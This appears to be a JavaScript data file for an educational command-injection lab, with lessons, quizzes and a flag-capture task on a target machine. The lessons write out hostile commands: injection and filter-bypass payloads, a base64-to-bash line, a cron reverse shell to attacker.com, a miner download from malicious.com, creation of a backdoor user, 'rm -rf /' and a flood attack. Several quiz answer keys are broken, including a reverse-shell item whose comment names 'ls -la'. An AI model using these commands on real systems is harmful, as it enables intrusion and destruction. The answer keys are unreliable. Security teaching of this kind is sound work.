// 命令注入漏洞实验模拟数据
export const CommandInjectionExperiment = {
  id: 4,
  name: '命令注入漏洞实验',
  introduction: '本实验将帮助你理解命令注入漏洞的原理、危害和防御方法',
  difficulty: 3,
  taskPoints: [
    {
      id: 1,
      name: '命令注入基础概念',
      description: '学习命令注入漏洞的基本原理和攻击方式',
      score: 5,
      document: '## 命令注入基础概念\n\n命令注入（Command Injection）是一种通过篡改传递给操作系统命令解释器的数据，以执行非预期命令的攻击技术。这种攻击利用应用程序未对用户输入进行充分过滤的漏洞，将恶意命令注入到合法命令中并执行。\n\n### 命令注入原理\n\n命令注入攻击的核心原理是利用系统命令解释器（如bash、cmd.exe等）的特性，通过特殊字符将攻击者的命令与原始命令连接起来，从而执行非预期操作。\n\n常见的命令连接符包括：\n\n- `;` - 命令分隔符（Linux/Unix/Windows）\n- `&&` - 逻辑AND，前一个命令成功则执行后一个（Linux/Unix/Windows）\n- `||` - 逻辑OR，前一个命令失败则执行后一个（Linux/Unix/Windows）\n- `|` - 管道符，将前一个命令的输出作为后一个命令的输入（Linux/Unix/Windows）\n- `$(...)` 或 `` `...` `` - 命令替换（Linux/Unix）\n- `&` - 后台运行命令（Linux/Unix/Windows）\n\n### 易受攻击的场景\n\n以下场景容易受到命令注入攻击：\n\n1. Web应用程序调用系统命令执行操作，如：\n   - 执行ping、nslookup等网络命令\n   - 调用系统工具处理用户上传的文件\n   - 通过系统命令发送邮件或生成报告\n\n2. 在命令行接口允许用户输入被传递给解释器的应用程序\n\n3. 将用户输入直接传递给系统命令的脚本',
      questions: [
        {
          id: 1,
          content: '命令注入攻击主要利用了什么安全漏洞？',
          score: 2,
          requiresTarget: false,
          type: 'multiple-choice',
          options: ['操作系统内核漏洞', '用户输入未经充分过滤直接用于系统命令', '网络防火墙配置错误', '浏览器安全设置不当'],
          answer: [1] // 用户输入未经充分过滤直接用于系统命令
        },
        {
          id: 2,
          content: '以下哪个字符可以用于连接两个不同的系统命令？',
          score: 3,
          requiresTarget: false,
          type: 'multiple-choice',
          options: ['.', ':', ';', '?'],
          answer: [2] // ;
        }
      ]
    },
    {
      id: 2,
      name: '命令注入攻击方式',
      description: '学习不同环境中命令注入攻击的具体方法',
      score: 7,
      document: '## 命令注入攻击方式\n\n命令注入可以通过多种方式实现，取决于目标系统的操作系统和应用程序的实现方式。\n\n### 基于分隔符的注入\n\n最常见的命令注入方法是使用命令分隔符连接恶意命令：\n\n```\n# 原始命令\nping example.com\n\n# 注入后\nping example.com; cat /etc/passwd\n```\n\n在这个例子中，攻击者不仅执行了ping命令，还执行了`cat /etc/passwd`命令来查看系统用户信息。\n\n### 命令替换注入\n\n在某些环境中，可以使用命令替换语法：\n\n```\n# 原始输入字段：用户名\nuserID\n\n# 注入后\n$(cat /etc/passwd)\n```\n\n应用程序可能会尝试执行一个使用了该用户ID的命令，但实际上会先执行括号内的命令，并将其输出作为用户ID使用。\n\n### 参数注入\n\n有时，应用程序会将用户输入作为命令的参数：\n\n```\n# 原始命令\nfind /data -name "user_input"\n\n# 如果用户输入：\n*.txt -o -name "*.php" -exec cat {} \\;\n\n# 最终命令变成：\nfind /data -name "*.txt" -o -name "*.php" -exec cat {} \\;\n```\n\n这会导致原本只查找文件的命令变成了查找并显示文件内容的命令。\n\n### 管道注入\n\n使用管道符可以将一个命令的输出传递给另一个命令：\n\n```\n# 原始命令\nping example.com\n\n# 注入后\nexample.com | cat /etc/shadow\n```\n\n### 空字节注入\n\n在某些使用C/C++的应用程序中，可以使用空字节（%00或\\0）截断字符串：\n\n```\n# 如果应用程序将输入附加到安全的命令后：\nsafecommand --parameter=user_input\n\n# 注入：\nmalicious%00\n\n# 可能被解释为：\nsafecommand --parameter=malicious\n```\n\n### 特殊技巧\n\n1. **避免空格**：某些过滤器会检测空格，可以使用Tab、$IFS（内部字段分隔符）等代替\n\n```\ncat${IFS}/etc/passwd\n```\n\n2. **编码绕过**：使用Base64等编码方式绕过过滤\n\n```\necho "Y2F0IC9ldGMvcGFzc3dkCg==" | base64 -d | bash\n```\n\n3. **通配符**：使用Shell通配符绕过对特定命令或路径的过滤\n\n```\n/???/??t /???/p?ss??\n# 等同于 /bin/cat /etc/passwd\n```\n\n4. **变量绕过**：使用环境变量或自定义变量绕过过滤\n\n```\nX=pas;Y=swd;cat /etc/$X$Y\n```',
      questions: [
        {
          id: 1,
          content: '如果Web应用使用以下代码处理ping请求：`exec("ping " + userInput)`，哪个输入最可能实现命令注入？',
          score: 3,
          requiresTarget: false,
          type: 'multiple-choice',
          options: ['example.com', '192.168.1.1', 'example.com; ls', 'ping'],
          answer: [2] // example.com; ls
        },
        {
          id: 2,
          content: '命令注入攻击中，${IFS}的作用是什么？',
          score: 4,
          requiresTarget: false,
          type: 'multiple-choice',
          options: ['终止命令执行', '提升执行权限', '绕过空格过滤', '隐藏命令执行历史'],
          answer: [2] // 绕过空格过滤
        }
      ]
    },
    {
      id: 3,
      name: '命令注入的危害',
      description: '了解命令注入攻击可能造成的各种危害',
      score: 8,
      document: '## 命令注入的危害\n\n命令注入攻击可能导致严重的安全后果，影响范围从信息泄露到完全控制目标系统。\n\n### 信息泄露\n\n攻击者可以访问敏感信息：\n\n```\n# 查看系统用户信息\ncat /etc/passwd\n\n# 查看网络配置\nifconfig\nip addr\n\n# 查看系统和环境信息\nuname -a\nenv\n\n# 查看应用程序配置文件\nfind / -name "*.conf" -type f -exec grep -l "password" {} \\;\n```\n\n### 文件操作\n\n攻击者可以创建、读取、修改或删除服务器上的文件：\n\n```\n# 创建文件\necho "内容" > /path/to/file\n\n# 读取文件\ncat /path/to/file\n\n# 修改文件\nsed -i \'s/原始内容/修改后内容/g\' /path/to/file\n\n# 删除文件\nrm -rf /path/to/file\n```\n\n### 权限提升\n\n攻击者可以尝试提升权限，获得更高级别的系统访问：\n\n```\n# 查找SUID文件\nfind / -perm -u=s -type f 2>/dev/null\n\n# 利用漏洞提权\n# 例如使用已知的内核漏洞或配置错误\n```\n\n### 持久化访问\n\n攻击者可以建立后门或创建新用户，确保未来能继续访问系统：\n\n```\n# 创建新用户\nuseradd -m hacker && echo "hacker:password" | chpasswd\n\n# 添加SSH密钥\nmkdir -p ~/.ssh && echo "攻击者的公钥" >> ~/.ssh/authorized_keys\n\n# 创建定时任务维持访问\necho "*/5 * * * * nc -e /bin/bash attacker.com 4444" > /tmp/cron && crontab /tmp/cron\n```\n\n### 横向移动\n\n攻击者可以利用已攻陷的服务器攻击内网其他系统：\n\n```\n# 扫描内网主机\nnmap -sT 192.168.1.0/24\n\n# 尝试连接到内网其他服务\nnc -zv 192.168.1.10 22 3306 80 443\n```\n\n### 破坏系统\n\n攻击者可能故意破坏系统：\n\n```\n# 删除重要系统文件\nrm -rf /\n\n# 关闭系统服务\nkillall apache2\nsystemctl stop mysql\n\n# 更改系统配置\necho "127.0.0.1 important-service.com" >> /etc/hosts\n```\n\n### 利用服务器资源\n\n攻击者可能利用服务器资源进行其他非法活动：\n\n```\n# 挖矿\nwget http://malicious.com/miner -O /tmp/miner && chmod +x /tmp/miner && /tmp/miner\n\n# 发起DDoS攻击\nhping3 --flood -S -p 80 target.com\n```\n\n### 现实案例影响\n\n实际命令注入攻击导致的后果包括：\n\n1. 客户数据泄露和身份盗窃\n2. 财务损失和勒索\n3. 业务中断\n4. 声誉损害\n5. 法律和合规问题\n\n一个知名的例子是Shellshock漏洞（CVE-2014-6271），这是Bash shell中的一个命令注入漏洞，影响了大量使用Bash的Web服务器和IoT设备。',
      questions: [
        {
          id: 1,
          content: '命令注入攻击可能导致哪些后果？',
          score: 4,
          requiresTarget: false,
          type: 'multiple-choice',
          options: ['仅限于信息泄露', '仅限于文件操作', '仅限于权限提升', '以上所有选项都是可能的后果'],
          answer: [1, 2, 3] // 以上所有选项都是可能的后果
        },
        {
          id: 2,
          content: '以下哪个命令最可能被用于在命令注入攻击中建立持久化访问？',
          score: 4,
          requiresTarget: false,
          type: 'multiple-choice',
          options: ['ls -la', 'echo "* * * * * nc -e /bin/bash attacker.com 4444" | crontab -', 'cat /etc/passwd', 'ping -c 4 8.8.8.8'],
          answer: [1] // ls -la
        }
      ]
    },
    {
      id: 4,
      name: '命令注入防御技术',
      description: '学习防御命令注入攻击的主要技术和最佳实践',
      score: 10,
      document: '## 命令注入防御技术\n\n防御命令注入攻击需要多层次的安全措施。以下是一些主要的防御技术和最佳实践：\n\n### 避免使用系统命令\n\n最有效的防御方法是完全避免使用系统命令。尽可能使用编程语言提供的API或库来实现相同功能。\n\n**示例 - 替代系统命令：**\n\n```python\n# 不安全 - 使用系统命令发送邮件\nos.system(f"mail -s \'{subject}\' {recipient} < {message_file}")\n\n# 安全 - 使用专用库发送邮件\nimport smtplib\nfrom email.message import EmailMessage\n\nmsg = EmailMessage()\nmsg.set_content(message)\nmsg[\'Subject\'] = subject\nmsg[\'To\'] = recipient\ns = smtplib.SMTP(\'localhost\')\ns.send_message(msg)\ns.quit()\n```\n\n### 输入验证和过滤\n\n如果必须使用系统命令，确保严格验证和过滤用户输入：\n\n1. **白名单验证**：只允许预定义的安全输入\n\n```python\n# 白名单验证示例\ndef is_valid_domain(domain):\n    return re.match(r\'^[a-zA-Z0-9][a-zA-Z0-9-]{0,61}[a-zA-Z0-9]\\.[a-zA-Z]{2,}$\', domain) is not None\n\nif is_valid_domain(user_input):\n    os.system(f"ping {user_input}")\nelse:\n    print("无效输入")\n```\n\n2. **移除或转义特殊字符**：过滤可能用于命令注入的字符\n\n```python\n# 过滤特殊字符示例\ndef sanitize_input(input_str):\n    # 移除可能用于命令注入的字符\n    return re.sub(r\'[;&|`\\\\!\\$*{}()<>\\[\\]\\"\\\']|\\.\\.\', \'\', input_str)\n\nsanitized_input = sanitize_input(user_input)\nos.system(f"ping {sanitized_input}")\n```\n\n### 参数化命令执行\n\n使用编程语言提供的参数化命令执行函数，而不是拼接字符串：\n\n```python\n# 不安全 - 命令拼接\nos.system("ping " + user_input)\n\n# 安全 - 参数化执行\nimport subprocess\nsubprocess.run(["ping", user_input], check=True)\n```\n\n参数化执行可以确保用户输入被视为单个参数，而不会被解释为命令的一部分。\n\n### 最小权限原则\n\n以最小必要权限运行应用程序：\n\n1. 创建专用的受限服务账户\n2. 使用chroot、容器或虚拟机隔离环境\n3. 使用AppArmor、SELinux等强制访问控制系统\n4. 使用系统调用过滤（如seccomp）限制可用的系统调用\n\n```bash\n# 创建受限用户运行应用\nadduser --system --no-create-home --disabled-login appuser\nchown -R appuser:appuser /var/www/app\nsu -s /bin/bash -c "cd /var/www/app && python3 app.py" appuser\n```\n\n### 输出编码\n\n对命令执行的输出进行适当编码，防止二次注入：\n\n```python\nimport html\n\n# 执行命令\nresult = subprocess.check_output([\'ping\', user_input], stderr=subprocess.STDOUT)\n\n# 编码输出以安全显示\nsafe_output = html.escape(result.decode())\nprint(f"<pre>{safe_output}</pre>")\n```\n\n### 错误处理\n\n避免显示详细的错误信息，可能泄露系统信息：\n\n```python\ntry:\n    subprocess.run([\'ping\', user_input], check=True)\nexcept subprocess.CalledProcessError:\n    print("执行命令时出错")\n    # 记录详细错误到日志，但不显示给用户\n    logging.error(f"Command execution failed for input: {user_input}", exc_info=True)\n```\n\n### 使用安全函数和库\n\n一些编程语言和框架提供了针对命令注入的安全功能：\n\n- PHP：使用 `escapeshellarg()` 和 `escapeshellcmd()`\n- Java：使用 `ProcessBuilder` 而非 `Runtime.exec()`\n- .NET：使用 `System.Diagnostics.Process` 的参数化方法\n\n### 安全审计和测试\n\n1. 代码审查：定期检查代码中可能存在的命令注入漏洞\n2. 自动化安全扫描：使用SAST、DAST工具\n3. 渗透测试：模拟攻击者行为测试应用程序安全性\n\n### 综合防御策略\n\n实施多层次防御策略，包括：\n\n1. 网络层安全控制（防火墙、WAF等）\n2. 应用程序安全控制（输入验证、参数化等）\n3. 系统安全控制（最小权限、环境隔离等）\n4. 监控和日志（检测异常命令执行）\n\n结合使用这些技术，可以显著降低命令注入攻击的风险。',
      questions: [
        {
          id: 1,
          content: '防御命令注入攻击的最佳实践是什么？',
          score: 5,
          requiresTarget: false,
          type: 'multiple-choice',
          options: ['增加防火墙规则', '避免使用系统命令，使用语言API代替', '定期更改系统密码', '限制网络连接'],
          answer: [1, 2] // 避免使用系统命令，使用语言API代替
        },
        {
          id: 2,
          content: '以下哪种方法能有效防止命令注入攻击？',
          score: 5,
          requiresTarget: false,
          type: 'multiple-choice',
          options: ['对用户输入使用单引号包围', '使用参数化命令执行而非字符串拼接', '限制命令执行时间', '仅允许管理员执行命令'],
          answer: [1, 2] // 使用参数化命令执行而非字符串拼接
        }
      ]
    },
    {
      id: 5,
      name: '命令注入实验环境',
      description: '在靶机环境中实践命令注入攻击的识别和利用',
      score: 10,
      document: "# 命令注入实验环境\n\n## 实验简介\n\n本实验环境提供了一个简单的网络工具Web界面，你将在这个环境中学习如何识别命令注入漏洞，并尝试构造特定的输入来执行非预期命令。\n\n**注意：本实验环境仅用于教育目的。** 所有操作都在受控环境中进行，这些技术在未经授权的情况下使用是违法的。\n\n## 实验目标\n\n1. 理解命令注入漏洞的原理\n2. 学习如何识别潜在的命令注入点\n3. 掌握构造命令注入载荷的基本技术\n4. 了解命令注入漏洞的防御方法\n\n## 实验环境说明\n\n实验环境包含：\n- 一个网络工具Web界面，提供ping、nslookup等功能\n- 一个包含漏洞的后端处理程序\n- 一个隐藏在系统中的flag文件\n\n## 实验步骤\n\n### 第一步：熟悉功能\n\n1. 尝试使用网络工具界面的基本功能\n2. 观察正常输入和输出的格式\n3. 了解应用程序的预期行为\n\n### 第二步：探测漏洞\n\n1. 尝试向输入字段提交包含特殊字符的内容，如 ';'、'&&'、'|'\n2. 观察应用程序对特殊字符的处理方式\n3. 确定哪些输入点可能存在命令注入漏洞\n\n### 第三步：漏洞利用\n\n1. 构造包含合法命令和注入命令的输入\n2. 尝试执行简单命令，如 'whoami'、'id'、'ls'\n3. 探索系统环境，查找敏感信息\n\n### 第四步：获取flag\n\n系统中隐藏了一个flag文件，目标是找到并读取这个文件：\n\n1. 使用命令注入漏洞搜索系统中的flag文件\n2. 读取flag文件内容\n3. 提交flag值完成实验\n\n## 实验小贴士\n\n- 如果直接执行命令失败，尝试使用不同的命令分隔符\n- 可能需要使用命令编码或特殊技巧绕过过滤\n- 对于复杂命令，可以考虑分步骤执行\n- 如果不确定系统环境，可以先执行信息收集命令\n\n## 实验评分标准\n\n实验评分基于以下几个方面：\n1. 成功识别命令注入漏洞（3分）\n2. 成功执行基本系统命令（3分）\n3. 成功获取flag（4分）\n\n## 安全提醒\n\n请记住：\n- 命令注入攻击在实际系统上未经授权是违法的\n- 负责任地披露发现的漏洞\n- 将所学知识用于构建更安全的应用程序\n\n现在，开始你的实验吧！",
      questions: [
        {
          id: 1,
          content: '请描述命令注入漏洞的基本原理 (在本前端模拟实验的上下文中)',
          score: 3,
          requiresTarget: false,
          type: 'open-ended-without-answer'
        },
        {
          id: 2,
          content: "如果一个Web应用提供了一个ping功能，以下哪个输入最可能成功实现命令注入？",
          score: 3,
          requiresTarget: false,
          type: 'single-choice',
          options: ["google.com", "google.com && whoami", "ping google.com", "google.com -t 10"],
          answer: 1 // google.com && whoami
        },
        {
          id: 3,
          content: '请构造一个命令注入攻击字符串，用于查找系统中的flag文件并显示其内容。请写出你的命令注入字符串和发现的flag值。',
          score: 4,
          requiresTarget: false,
          type: 'open-ended-with-answer'
        }
      ]
    }
  ],
  targetMachine: {
    id: '550e8400-e29b-41d4-a716-446655440003'
  }
}; 